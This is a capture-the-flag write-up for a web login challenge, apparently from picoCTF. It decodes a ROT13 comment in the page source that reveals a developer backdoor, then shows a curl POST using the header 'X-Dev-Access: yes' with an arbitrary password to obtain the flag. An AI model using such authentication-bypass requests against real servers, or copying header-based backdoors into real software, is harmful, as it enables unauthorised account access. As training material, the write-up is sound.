<h1>Challenge Overview</h1>

The challenge provides a simple login page implemented using HTML and JavaScript. 
The login form sends credentials via a POST request to the /login endpoint and expects a JSON response. 
Upon successful authentication, the server returns a flag.

**Click <Ctrl+U> and go view source. Here we see comment** 
<!-- ABGR: Wnpx - grzcbenel olcnff: hfr urnqre "K-Qri-Npprff: lrf" -->
<!-- Remove before pushing to production! -->


**The comment appears obfuscated.**

The text was decoded using ROT13, resulting in:
ABGR → NOTE
Wnpx → Jack
grzcbenel → temporary
olcnff → bypass
hfr → use
urnqre → header
"K-Qri-Npprff: lrf" → "X-Dev-Access: yes"

**Overall:**  NOTE: Jack - temporary bypass: use header "X-Dev-Access: yes"

This clearly indicates the presence of a developer backdoor, allowing authentication bypass by setting a specific HTTP header.


## Understanding the Vulnerability

* The /login endpoint checks if the user exists.
* Normally, it verifies the password.
* However, when the header 'X-Dev-Access: yes' is present, the password verification is skipped.
* The user must still exist, but the password can be anything.


**Exploitation**

A crafted POST request was sent to the /login endpoint with the required header:

'curl -X POST http://amiable-citadel.picoctf.net:64319/login \
  -H "Content-Type: application/json" \
  -H "X-Dev-Access: yes" \
  -d '{"email":"ctf-player@picoctf.org","password":"any"}' '

**Result:** {"success":true,"email":"ctf-player@picoctf.org","firstName":"pico","lastName":"player","flag":"picoCTF{flag}"} 


